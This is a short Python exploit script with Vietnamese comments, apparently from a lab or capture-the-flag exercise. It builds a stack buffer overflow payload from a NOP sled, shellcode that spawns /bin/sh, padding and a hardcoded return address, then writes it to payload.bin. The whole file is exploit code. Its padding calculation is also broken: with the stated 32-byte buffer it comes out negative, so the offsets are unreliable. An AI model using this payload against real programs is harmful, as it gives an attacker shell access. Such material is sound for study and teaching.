import struct

# Địa chỉ của buffer trên stack (DEBUG: %p in ra)
buffer_addr = 0x7fffffffdd70

# Shellcode mở shell
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

# NOP sled để giúp shellcode dễ được thực thi
nop_sled = b"\x90" * 64

# Độ dài buffer trong chương trình
buffer_size = 32

# Padding để ghi đè đến return address
padding = b"A" * (buffer_size - len(nop_sled) - len(shellcode))

# Tạo payload với return address
payload = nop_sled + shellcode + padding + struct.pack("<Q", buffer_addr)

# Xuất payload ra file hoặc in ra
with open("payload.bin", "wb") as f:
    f.write(payload)

print(f"Payload created. Length: {len(payload)} bytes.")

